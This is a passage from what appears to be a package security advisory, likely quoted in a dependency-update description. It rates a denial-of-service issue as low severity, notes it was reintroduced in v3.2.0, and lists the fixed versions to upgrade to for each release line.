As it takes 50,000 characters to block the event loop for 2 seconds, this issue is a low severity issue.

This was later re-introduced in version v3.2.0, and then repatched in versions 3.2.7 and 4.3.1.

## Recommendation

Version 2.x.x: Update to version 2.6.9 or later.
Version 3.1.x: Update to version 3.1.0 or later.
Version 3.2.x: Update to version 3.2.7 or later.
Version 4.x.x: Update to version 4.3.1 or later.

</blockquote>
</details>
</details></td></tr>
</table>